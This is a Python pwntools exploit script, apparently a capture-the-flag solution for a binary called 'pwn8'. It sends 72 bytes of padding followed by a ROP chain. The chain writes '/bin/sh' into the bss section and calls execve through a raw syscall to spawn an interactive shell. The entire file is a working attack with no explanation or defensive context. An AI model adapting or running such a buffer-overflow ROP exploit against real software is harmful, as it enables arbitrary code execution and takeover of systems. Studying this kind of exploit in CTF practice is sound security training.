from pwn import *

context.binary = binary = ('./pwn8')

p = process('./pwn8')

# gdb.attach(p)

bss = 0x4bb050
mov = 0x410739      #0x0000000000410739 : mov qword ptr [rsi], rdi ; ret
pop_rsi = 0x404502  #0x0000000000404502 : pop rsi ; ret
pop_rdi = 0x401726  #0x0000000000401726 : pop rdi ; ret
pop_rdx = 0x43cd25  #0x000000000043cd25 : pop rdx ; ret
pop_rax = 0x43d69c  #0x000000000043d69c : pop rax ; ret
syscall = 0x4022c4  #0x00000000004022c4 : syscall
str_binsh = 0x0068732f6e69622f  #2F 62 69 6E 2F 73 68

#mov /bin/sh to bss
payload = b'A'*72
payload += p64(pop_rdi)
payload += p64(str_binsh)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(mov)
#call execve('bin/sh', 0, 0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
#call syscall
payload += p64(syscall)

p.sendline(payload)

p.interactive()